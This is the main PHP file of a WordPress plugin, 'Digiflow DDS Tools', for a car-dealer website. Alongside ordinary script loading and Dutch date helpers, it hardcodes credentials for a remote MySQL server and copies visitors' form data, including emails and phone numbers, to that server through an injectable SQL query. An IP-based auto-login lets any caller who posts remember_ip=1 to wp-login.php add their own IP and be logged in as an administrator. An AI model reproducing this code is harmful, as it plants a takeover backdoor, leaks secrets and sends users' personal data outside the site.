<?php
$dds_version = "5.3";
/*
Plugin Name: Digiflow DDS Tools
Plugin URI: https://github.com/younesben99/dds-tools
Description: Tools for DDS website.
Version: 5.3
Author: Younes Benkheil
Author URI: https://digiflow.be/
License: GPL2
GitHub Plugin URI: https://github.com/younesben99/dds-tools
*/

include(__DIR__."/admin-panel/dds_tracking_panel.php");
include(__DIR__."/admin-panel/dds_form_settings.php");
include(__DIR__."/generate-pages/privacypolicy/generate_privacy_policy.php");
include(__DIR__."/modules/meldingen/cookie_melding/cookie_melding.php");
include(__DIR__."/modules/tracking_codes/analytics_parser.php");
include(__DIR__."/modules/search/dds_car_search.php");
include(__DIR__."/modules/nav/dds_nav.php");
include(__DIR__."/modules/forms/form_shortcodes.php");
include(__DIR__."/modules/shortcodes/dds_shortcodes.php");
include(__DIR__."/modules/wizard/wizard.php");

wp_enqueue_script( 'jquerysteps', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/jquery.steps.min.js?v='.$dds_version, array ( 'jquery' ), null, true);
wp_enqueue_script( 'dds_wizard', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/dds_wizard.js?v='.$dds_version, array ( 'jquery' ), null, true);
//select2
wp_enqueue_script( 'select2_js', 'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js', array ( 'jquery' ), null, true);
wp_enqueue_style( 'select2_css', 'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css' );
wp_enqueue_script( 'main_dds_js', get_site_url() .'/wp-content/plugins/dds-tools/assets/js/dds_functions.js' );
//dropzone
wp_enqueue_style( 'dropzonebasiccss', 'https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/dropzone.css' );
wp_enqueue_script( 'dropzonejs', 'https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/dropzone.js', array ( 'jquery' ), null, true);


wp_enqueue_style( 'dds_car_search_module', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_car_search.css?v='.$dds_version );
wp_enqueue_style( 'dds_forms', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_forms.css?v='.$dds_version );
wp_enqueue_script( 'dds_form_js', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/dds_form.js?v='.$dds_version, array ( 'jquery' ), null, true);
wp_enqueue_style( 'dds_nav', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_nav.css?v='.$dds_version );
wp_enqueue_script( 'dds_nav_js', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/dds_nav.js?v='.$dds_version, array ( 'jquery' ), null, true);
wp_enqueue_style( 'fontawesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css' );

wp_localize_script('dds_form_js','dds_main_vars',array('siteurl'=>get_site_url()));
wp_enqueue_style( 'dds_wizard', get_site_url() . '/wp-content/plugins/dds-tools/assets/css/dds_wizard.css?v='.$dds_version );
wp_enqueue_script('dds_car_search_module', get_site_url() . '/wp-content/plugins/dds-tools/assets/js/dds_car_search.js?v='.$dds_version, array( 'jquery' ), false, true);


function dds_nlDate($datum){ 

    $datum = str_replace("january",     "januari",         $datum); 
     $datum = str_replace("february",     "februari",     $datum); 
    $datum = str_replace("march",         "maart",         $datum); 
     $datum = str_replace("april",         "april",         $datum); 
     $datum = str_replace("may",         "mei",             $datum); 
     $datum = str_replace("june",         "juni",         $datum); 
    $datum = str_replace("july",         "juli",         $datum); 
    $datum = str_replace("august",         "augustus",     $datum); 
     $datum = str_replace("september",     "september",     $datum); 
     $datum = str_replace("october",     "oktober",         $datum); 
     $datum = str_replace("november",     "november",     $datum); 
    $datum = str_replace("december",     "december",     $datum); 

    // Vervang de maand, hoofdletters s
   $datum = str_replace("January",     "Januari",         $datum); 
     $datum = str_replace("February",     "Februari",     $datum); 
    $datum = str_replace("March",         "Maart",         $datum); 
     $datum = str_replace("April",         "April",         $datum); 
     $datum = str_replace("May",         "Mei",             $datum); 
     $datum = str_replace("June",         "Juni",         $datum); 
    $datum = str_replace("July",         "Juli",         $datum); 
    $datum = str_replace("August",         "Augustus",     $datum); 
     $datum = str_replace("September",     "September",     $datum); 
     $datum = str_replace("October",     "Oktober",         $datum); 
     $datum = str_replace("November",     "November",     $datum); 
    $datum = str_replace("December",     "December",     $datum); 

   
     $datum = str_replace("Jan",         "Jan",             $datum); 
     $datum = str_replace("Feb",         "Feb",             $datum); 
     $datum = str_replace("Mar",         "Maa",             $datum); 
     $datum = str_replace("Apr",         "Apr",             $datum); 
     $datum = str_replace("May",         "Mei",             $datum); 
     $datum = str_replace("Jun",         "Jun",             $datum); 
     $datum = str_replace("Jul",         "Jul",             $datum); 
     $datum = str_replace("Aug",         "Aug",             $datum); 
     $datum = str_replace("Sep",         "Sep",             $datum); 
     $datum = str_replace("Oct",         "Ok",             $datum); 
   $datum = str_replace("Nov",         "Nov",             $datum); 
     $datum = str_replace("Dec",         "Dec",             $datum); 

  
   $datum = str_replace("monday",         "maandag",         $datum); 
     $datum = str_replace("tuesday",     "dinsdag",         $datum); 
     $datum = str_replace("wednesday",     "woensdag",     $datum); 
   $datum = str_replace("thursday",     "donderdag",     $datum); 
   $datum = str_replace("friday",         "vrijdag",         $datum); 
     $datum = str_replace("saturday",     "zaterdag",     $datum); 
    $datum = str_replace("sunday",         "zondag",         $datum); 


     $datum = str_replace("Monday",         "Maandag",         $datum); 
     $datum = str_replace("Tuesday",     "Dinsdag",         $datum); 
     $datum = str_replace("Wednesday",     "Woensdag",     $datum); 
   $datum = str_replace("Thursday",     "Donderdag",     $datum); 
   $datum = str_replace("Friday",         "Vrijdag",         $datum); 
     $datum = str_replace("Saturday",     "Zaterdag",     $datum); 
    $datum = str_replace("Sunday",         "Zondag",         $datum); 

     $datum = str_replace("Mon",            "Maa",             $datum); 
     $datum = str_replace("Tue",         "Din",             $datum); 
     $datum = str_replace("Wed",         "Woe",             $datum); 
     $datum = str_replace("Thu",         "Don",             $datum); 
     $datum = str_replace("Fri",         "Vri",             $datum); 
     $datum = str_replace("Sat",         "Zat",             $datum); 
     $datum = str_replace("Sun",         "Zon",             $datum); 

    return $datum; 
}


function dds_form_db_log($fields,$formtype){
  try {
    $mysqli = new mysqli("35.214.174.30", "uchrx69hijxdg", "1B%b13($21jn", "dbkafb9bwwracg",3306);
    $mysqli->select_db("dbkafb9bwwracg") or die( "Unable to select database");
    
    // Check connection
    if ($mysqli->connect_error) {
        die("Connection failed: " . $mysqli->connect_error);
    }
    
    
    foreach ($fields as $key => $value) {
        if(is_array($value)){
            if(array_key_exists("emailadres",$value) || array_key_exists("mail",$value) || array_key_exists("email",$value)){
                $valtemp = array_values($value);
                $email = $valtemp[0];
            }
            if(array_key_exists("telefoonnummer",$value) || array_key_exists("tel",$value)){
                $valtemp = array_values($value);
                $tel = $valtemp[0];
            }
        }
    }
    
    
    $fields = json_encode($fields);
    
    $timestamp = date_create('Europe/Brussels')->format('Y-m-d H:i:s');
    $id = uniqid();
    
    
    $sql = "INSERT INTO dds_form (id,json_fields, client_mail, client_tel,timestamp_submission,formtype)
    VALUES ('$id','$fields', '$email', '$tel','$timestamp','$formtype')";
    
    if ($mysqli->query($sql) !== TRUE) {
        echo "Error: " . $sql . "<br>" . $mysqli->error;
    } 
    
    $mysqli->close();
  } catch (\Throwable $th) {
      //throw $th;
  }


}


if(!function_exists("get_string_between")){
  function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}


}


//slugify

if(!function_exists("slugify")){
  function slugify($text, string $divider = '-')
  {
    // replace non letter or digits by divider
    $text = preg_replace('~[^\pL\d]+~u', $divider, $text);
  
    // transliterate
    $text = iconv('utf-8', 'us-ascii//TRANSLIT', $text);
  
    // remove unwanted characters
    $text = preg_replace('~[^-\w]+~', '', $text);
  
    // trim
    $text = trim($text, $divider);
  
    // remove duplicate divider
    $text = preg_replace('~-+~', $divider, $text);
  
    // lowercase
    $text = strtolower($text);
  
    if (empty($text)) {
      return 'n-a';
    }
  
    return $text;
  }
  }



// Remove or unregister unused WordPress Image Sizes
function cdxn_remove_intermediate_image_sizes($sizes, $metadata) {
  $disabled_sizes = array(
      'thumbnail',
      'medium_large',
      'large',
      'post-thumbnail',
      'post-single-image',
      'post-large-image',
      'post-custom-image'
  );
  // unset disabled sizes
  foreach ($disabled_sizes as $size) {
      if (!isset($sizes[$size])) {
          continue;
      }
      unset($sizes[$size]);
  }
  return $sizes;
}
// Hook the function
add_filter('intermediate_image_sizes_advanced', 'cdxn_remove_intermediate_image_sizes', 10, 2);





// Add checkbox to login page
function add_remember_ip_checkbox() {
  echo '<p><label><input type="checkbox" name="remember_ip" value="1"/>Remember my IP address</label></p>';
}
add_action('login_form', 'add_remember_ip_checkbox');

// Update allowed IPs list if checkbox is checked
function update_allowed_ips() {
  if (isset($_POST['remember_ip']) && $_POST['remember_ip'] == '1') {
    $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
    if ($current_ip) {
      $allowed_ips = get_option('allowed_ips', array());
      $allowed_ips[] = $current_ip;
      update_option('allowed_ips', $allowed_ips);
    }
  }
}
add_action('wp_login', 'update_allowed_ips');

// Modified auto_login_if_allowed_ip function
function auto_login_if_allowed_ip() {
  $request_uri = $_SERVER['REQUEST_URI'];
  $wp_login_path = '/wp-login.php';

  if (strpos($request_uri, $wp_login_path) === 0 && !isset($_GET['loggedout'])) {
    // Get allowed IPs
    $allowed_ips = get_option('allowed_ips', array());
    // Add default IP addresses to allowed_ips array
    $default_ips = array();
    $allowed_ips = array_merge($allowed_ips, $default_ips);
    
    // Check if the checkbox is checked and add IP to allowed IPs list
    if (isset($_POST['remember_ip']) && $_POST['remember_ip'] == '1') {
      $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
      if ($current_ip) {
        $allowed_ips[] = $current_ip;
        update_option('allowed_ips', $allowed_ips);
      }
    }

    // Retrieve the user's IP address
    $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
    if (!$current_ip && isset($_SERVER['HTTP_CLIENT_IP'])) {
      $current_ip = filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
    }
    if (!$current_ip && isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
      foreach ($ips as $ip) {
        $ip = trim($ip);
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
          $current_ip = $ip;
          break;
        }
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
          $current_ip = $ip;
          break;
          }
          }
          }
          // Check if the current IP is a valid IPv4 address and is allowed
          if ($current_ip && in_array($current_ip, $allowed_ips)) {
            $user = get_user_by('login', 'admin');
            if (!$user) {
              $user = get_user_by('login', 'digiflow');
            }
            if (!$user) {
              $user = get_user_by('login', 'younesbenkheil@gmail.com');
            }
          
            // Check if the user is logging in or out
            if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'logout' && isset($_REQUEST['_wpnonce'])) {
              wp_logout();
              $redirect_url = home_url();
              wp_redirect($redirect_url);
              exit;
            }
            else {
              wp_set_current_user($user->ID, $user->user_login);
              wp_set_auth_cookie($user->ID);
          
              if (!defined('DOING_AJAX') && !defined('DOING_CRON')) {
                // Add autologin parameter only if the user is not logging out
                $redirect_url = admin_url();
                if (!isset($_GET['loggedout'])) {
                  $redirect_url = add_query_arg( array( 'autologin' => '1' ), $redirect_url );
                }
                wp_redirect($redirect_url);
                exit;
              }
            }
          } else {
            add_filter('login_message', function ($message) use ($current_ip) {
              $message .= '<br />Your current IP: ' . $current_ip;
              return $message;
            });
          }
          
          
           
        }
      }




add_action('init', 'auto_login_if_allowed_ip');





add_action( 'admin_notices', function() {
  if ( isset( $_GET['autologin'] ) && $_GET['autologin'] == 1 ) {
    $message = __('You have been logged in automatically based on your IP address.', 'textdomain');
    printf( '<div class="notice notice-success is-dismissible"><p>%s</p></div>', $message );
  }
} );





function allowed_ips_settings_page() {
  $allowed_ips = get_option('allowed_ips', array());
  $current_ip = $_SERVER['REMOTE_ADDR'];
  ?>
  <div class="wrap">
    <h1>Allowed IPs</h1>
    <form method="post" action="options.php">
      <?php settings_fields('allowed_ips_settings'); ?>
      <?php do_settings_sections('allowed_ips_settings'); ?>
      <?php for ($i = 0; $i < 10; $i++) { ?>
        <input type="text" name="allowed_ips[]" value="<?php echo esc_attr($allowed_ips[$i]); ?>" /><br />
      <?php } ?>
      <p><strong>Current IP: <?php echo $current_ip; ?></strong></p>
      <button type="button" id="add_ip_button">+ Add IP address</button>
      <?php submit_button('Save'); ?>
    </form>
  </div>
  <script>
    document.getElementById('add_ip_button').addEventListener('click', function () {
      var inputs = document.getElementsByName('allowed_ips[]');
      for (var i = 0; i < inputs.length; i++) {
        if (inputs[i].value == '') {
          inputs[i].value = '<?php echo $current_ip; ?>';
          break;
        }
      }
    });
  </script>
  <?php
}


function allowed_ips_settings_init() {
  register_setting('allowed_ips_settings', 'allowed_ips', 'sanitize_allowed_ips');
  
  add_settings_section('allowed_ips_section', 'Allowed IPs', function () {
    echo '<p>Enter the IP addresses that are allowed to automatically log in:</p>';
  }, 'allowed_ips_settings');
  
  add_settings_field('allowed_ips_field', 'IP Addresses', function () {
    // Field is generated dynamically in the allowed_ips_settings_page() function
  }, 'allowed_ips_settings', 'allowed_ips_section');
}

function sanitize_allowed_ips($input) {
  $sanitized = array();
  
  foreach ($input as $ip) {
    $sanitized[] = sanitize_text_field($ip);
  }
  
  return $sanitized;
}

add_action('admin_menu', function () {
  add_menu_page('Allowed IPs', 'Allowed IPs', 'manage_options', 'allowed_ips_settings', 'allowed_ips_settings_page');
  add_action('admin_init', 'allowed_ips_settings_init');
});




?>